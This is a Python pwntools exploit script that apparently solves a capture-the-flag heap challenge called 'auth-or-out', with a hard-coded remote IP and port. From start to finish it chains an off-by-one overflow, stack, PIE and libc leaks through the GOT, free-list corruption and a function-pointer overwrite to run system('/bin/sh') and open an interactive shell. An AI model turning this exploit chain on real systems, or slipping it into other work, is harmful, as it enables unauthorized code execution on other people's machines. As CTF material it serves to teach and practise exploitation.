from pwn import *

LOCAL = True
REMOTE = False
GDB = False

if REMOTE:
	LOCAL = False
	GDB = False

# Cant have GDB and non local
if(GDB == True and LOCAL == False):
	LOCAL = True

local_bin = "./auth-or-out"
libc_our = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

if REMOTE: 
	p = remote('144.126.206.249',32368)
if LOCAL:
	p = process(local_bin)
if GDB:
	gdb.attach(p.pid,''' 
	pie breakpoint 0x143d
	pie breakpoint 0x190c
	c
	''')
	
def add_author(name,surname,age,note_size,note):
	p.sendlineafter(b"Choice: ",b"1")
	
	p.sendafter(b"Name: ",name)
	p.sendafter(b"Surname: ",surname)
	p.sendlineafter(b"Age: ",age)
	p.sendlineafter(b"Author Note size: ",note_size)
	if note != b"":
		p.sendlineafter(b"Note: ",note)
	
	return p.recvuntil(b"added!\n\n").split(b" ")[1]
	
def modify_author(aid,name,surname,age):
	p.sendlineafter(b"Choice: ",b"2")
	
	p.sendlineafter(b"Author ID: ",aid)
	p.sendafter(b"Name: ",name)
	p.sendafter(b"Surname: ",surname)
	p.sendlineafter(b"Age: ",age)
	
def print_author(aid):
	p.sendlineafter(b"Choice: ",b"3")
	
	p.sendlineafter(b"Author ID: ",aid)
	
	return p.recvuntil(b"-----------------------\n\n").split(b"\n-----------------------")[0].split(b"----------------------\n")[1].split(b"\n")

def free_author(aid):
	p.sendlineafter(b"Choice: ",b"4")
	
	p.sendlineafter(b"Author ID: ",aid)
	
	p.recvuntil(b"deleted!\n\n")
	
def return_main():
	p.sendlineafter(b"Choice: ",b"5")

log.info("Creating chunk for stack leak")
# Create new author
leak_author = add_author(b"X"*16, b"X"*16, b"18446744073709551615", b"7", b"X"*8)
# Surname wants 17 bytes instead of 16 in modify and this way we will overflow by one
modify_author(leak_author, b"X"*16, b"A"*17, b"123456")

leak_raw = print_author(leak_author)[2].split(b"A"*16)[1]
stack_ptr = u64(leak_raw.ljust(8,b"\x00"))
log.info("Stack pointer: "+hex(stack_ptr))
log.info("Arena meta pointer: "+hex(stack_ptr - 0x38 - 0x110))

if(b"\n" in p64(stack_ptr)):
	log.critical("Stack memory regions contain newline, exiting")
	p.close()
	exit(1)

log.info("Creating another chunk to prepare for PIE leak")

fake_chunk = add_author(b"B"*16, b"B"*16, b"18446744073709551615", b"7", b"B"*8)

free_author(leak_author)
free_author(fake_chunk)

log.info("Leaking PIE")
pie_leak = add_author(b"C"*16, b"C"*16, b"18446744073709551615", b"48", b"C"*48)

#0x7ffd69f786c0: 0x4343434343434343      0x0043434343434343
#0x7ffd69f786d0: 0x4343434343434343      0x4143434343434343
#0x7ffd69f786e0: 0x00007ffd69f786f8      0xffffffffffffffff
#0x7ffd69f786f0: 0x0000563bc5801219      0x4242424242424242
#0x7ffd69f78700: 0x4242424242424242      0x4242424242424242
#0x7ffd69f78710: 0x4242424242424242      0x4242424242424242
#0x7ffd69f78720: 0x4242424242424242      0xffffffffffffffff
#0x7ffd69f78730: 0x0000563bc5801219      0x0042424242424242

leak_raw = print_author(pie_leak)[4].split(b"\xff"*8)[1][0:6]
note_print_ptr = u64(leak_raw.ljust(8,b"\x00"))
binary = note_print_ptr - 0x1219
log.info("Note function: "+hex(note_print_ptr))
log.info("Binary base: "+hex(binary))

if(b"\n" in p64(binary)):
	log.critical("Binary memory regions contain newline, exiting")
	p.close()
	exit(1)

free_author(pie_leak)

log.info("Leaking libc using unutilized note pointer")

# Creating 2 chunks to align memory
dummy = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)
dummy2 = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)

log.info("Freeing dummy chunks")
# Freeing them
free_author(dummy)
free_author(dummy2)

# Creating leak chunk which will overwrite the pointer
size = b"48" # 8 bytes to align to 16 bytes, 32 to get over surname and name and finally pointer 8
strtoull_addr = binary + 0x202fb0 + 8 # strtoull
got_plt_strtoull_packed = p64(strtoull_addr)

if(b"\n" in got_plt_strtoull_packed):
	log.critical("Got plt function pointer contains newline, exiting")
	p.close()
	exit(1)

payload = b"X"*40 + got_plt_strtoull_packed

log.info("Reading libc leak from got.plt at : "+hex(strtoull_addr))

crafted_arbitrary_read_chunk = add_author(b"X"*16, b"X"*16, b"0", size, payload)

# Now we need to free this chunk and allocate one smaller
free_author(crafted_arbitrary_read_chunk)

# To offset our next chunk
dummy = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)

# This must be zero size long note
got_plt_leak_chunk = add_author(b"A"*16, b"A"*16, b"0", b"0", b"")

log.info("Our leak chunk is at : "+str(int(got_plt_leak_chunk)))

log.info("We should have arbitrary read primitive ready")

leak_raw = print_author(got_plt_leak_chunk)[4].split(b"Note: [")[1][0:6]
read_leak_addr = u64(leak_raw.ljust(8,b"\x00"))

if LOCAL:
	libc = read_leak_addr - libc_our.sym['strtoull']
	system = libc + libc_our.sym['system']
else: # libc-2.33-1-x86_64 is a guess
	libc = read_leak_addr - 0x45260
	system = libc + 0x4f550

log.info("Read leak: "+hex(read_leak_addr))
log.info("LIBC base: "+hex(libc))
log.info("System: "+hex(system))

# This chunk above cannot be freed, as got.plt won't be writable and we wil segfault

log.info("Preparing chunk that will corrupt free list")
# System chunk
# Must be zero sized to properly align linked list
corrupt_list_chunk = add_author(b"a"*16, b"a"*16, b"0", b"0", b"")

log.info("Creating dummy chunks for arbitrary free")
# Creating 2 chunks to align memory
dummy = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)
dummy2 = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)

log.info("Freeing these chunks")
# Freeing them
free_author(dummy)
free_author(dummy2)

# Creating chunk which will get the arbitrary free pointer
size = b"48" # 8 bytes to align to 16 bytes, 32 to get over surname and name and finally pointer 8
system_chunk_addr = stack_ptr + 0xf0 # address for our system chunk (top chunk)
corrupt_list_chunk_packed = p64(system_chunk_addr)
payload = b"X"*40 + corrupt_list_chunk_packed

log.info("Overwriting dummy chunk for arb free")
arb_free_chunk = add_author(b"X"*16, b"X"*16, b"0", size, payload)

# Now we need to free this chunk and allocate one smaller
free_author(arb_free_chunk)

# To offset our next chunk
dummy = add_author(b"A"*16, b"A"*16, b"0", b"7", b"A"*8)

# This must be zero size long note
free_bomb = add_author(b"A"*16, b"A"*16, b"0", b"0", b"")

# Keep zero sized!
system_chunk = add_author(b"a"*16, b"a"*16, b"0", b"0", b"")

log.info("System chunk is at index: "+str(system_chunk,'UTF-8'))

log.info("Free bomb has been planted and free_bomb")
free_author(corrupt_list_chunk)
free_author(free_bomb)

# Overwrite chunk
# Prefix is just a random chunk before our freed one so we can do it with random data
prefix = b"\x90" * 32 + p64(0xdeadbeefbeefdead) + b"\xff" * 8 + p64(0xdeadbeefbeefdead)
# Actual chunk which is needed
bin_sh_ptr = p64(stack_ptr + 0x128)
             # Name + surname       # note *            # Age         # Note func ptr   # Note string itself
payload = prefix + b"\x80" * 32 + bin_sh_ptr + p64(0xdeadbeefbeefdead) + p64(system) + b"/bin/sh\x00"
size = len(prefix) + len(payload)

size_b = bytes(str(size),'UTF-8')
log.info("Payload size: "+hex(size))
write_chunk = add_author(b"z"*16, b"z"*16, b"0", size_b, payload)

# Trigger shell, enjoy
p.sendlineafter(b"Choice: ",b"3")
p.sendlineafter(b"Author ID: ",system_chunk)

p.recvuntil(b"Age: ")
p.recvuntil(b"\n")
log.info("Serving shell :)...")

p.interactive()
	
